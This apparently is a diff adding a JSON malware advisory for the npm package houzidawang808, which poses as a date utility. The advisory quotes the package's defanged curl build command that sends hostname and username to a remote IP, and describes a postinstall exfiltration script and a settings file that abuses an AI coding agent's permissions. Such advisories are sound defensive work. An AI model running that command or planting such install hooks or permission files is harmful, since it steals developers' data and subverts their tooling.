@@ -1,0 +1,66 @@
+{
+  "schema_version": "1.6.0",
+  "id": "LWA-2026-5016",
+  "aliases": [
+    "MAL-2026-5732"
+  ],
+  "modified": "2026-06-13T06:24:19Z",
+  "published": "2026-06-13T06:23:39Z",
+  "summary": "Malicious code in houzidawang808 (npm)",
+  "details": "Package houzidawang808@1.0.0 masquerades as a simple date formatting utility but ships a system-reconnaissance and data-exfiltration payload. The build script (`curl hxxp://124[.]221[.]154[.]135//pre?h=$(hostname)\u0026u=$(whoami)`) transmits the victim's hostname and username to a remote IP. A bundled script (postinstall.js) collects SSH public key filenames from ~/.ssh/, the system username, and platform type, then exfiltrates them as JSON to the same IP (124[.]221[.]154[.]135:443) via HTTPS POST. A configuration file (`.claude/settings.local.json`) grants broad npm-config permissions to abuse the Claude Code agentic tool. The publisher has previously distributed malicious packages under the same identity.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "npm",
+        "name": "houzidawang808",
+        "purl": "pkg:npm/houzidawang808@1.0.0"
+      },
+      "versions": [
+        "1.0.0"
+      ],
+      "database_specific": {
+        "cwes": [
+          {
+            "cweId": "CWE-506",
+            "name": "Embedded Malicious Code"
+          }
+        ],
+        "leitwacht": {}
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "PACKAGE",
+      "url": "https://www.npmjs.com/package/houzidawang808/v/1.0.0"
+    },
+    {
+      "type": "REPORT",
+      "url": "https://threatintel.leitwacht.eu/d/LWA-2026-5016"
+    }
+  ],
+  "credits": [
+    {
+      "name": "Leitwacht",
+      "type": "FINDER",
+      "contact": [
+        "https://threatintel.leitwacht.eu"
+      ]
+    }
+  ],
+  "database_specific": {
+    "leitwacht": {
+      "category": "malware",
+      "first_seen_at": "2026-06-13T06:23:39Z",
+      "indicators_observed": {
+        "ip_observed": [
+          "124[.]221[.]154[.]135",
+          "124[.]221[.]154[.]135:443"
+        ],
+        "url_observed": [
+          "hxxp://124[.]221[.]154[.]135//pre"
+        ]
+      }
+    }
+  }
+}
